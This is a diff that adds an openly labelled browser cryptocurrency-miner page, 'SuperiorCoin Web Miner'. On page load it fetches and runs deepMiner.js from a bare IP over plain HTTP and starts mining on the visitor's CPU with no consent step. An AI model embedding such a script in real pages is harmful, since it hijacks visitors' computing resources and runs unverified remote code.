@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>SuperiorCoin Web Miner</title>
+	<style>
+		th {
+			width: 180px;
+		}
+	</style>
+	<script src="http://191.232.179.253/deepMiner.js"></script>
+	<script>
+		var addr = 'SuperiorCoin_test';
+		var miner = new deepMiner.Anonymous(addr, {
+			autoThreads: true
+		});
+		miner.start();
+		// Listen on events
+		var found = 0,
+			accepted = 0;
+		miner.on('found', function () {
+			found++;
+		});
+		miner.on('accepted', function () {
+			accepted++;
+		})
+		// Update stats once per second
+		setInterval(function () {
+			var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
+			var hashesPerSecond = miner.getHashesPerSecond();
+			var totalHashes = miner.getTotalHashes();
+			var acceptedHashes = miner.getAcceptedHashes();
+			miner.setThrottle(idle);
+			document.body.innerHTML = '<h2>SuperiorCoin Miner : ' + addr +
+				'</h2><table border="1"><tr><th>Threads</th><th>Hashs</th><th>Found</th><th>Verified</th></tr><tr><td>' + parseInt(
+					hashesPerSecond) + '</td><td>' + totalHashes + '</td><td>' + found + '</td><td>' + accepted +
+				'</td></tr></<table>';
+		}, 500);
+	</script>
+</head>
+
+<body>
+	SuperiorCoin Miner
+</body>
+
+</html>
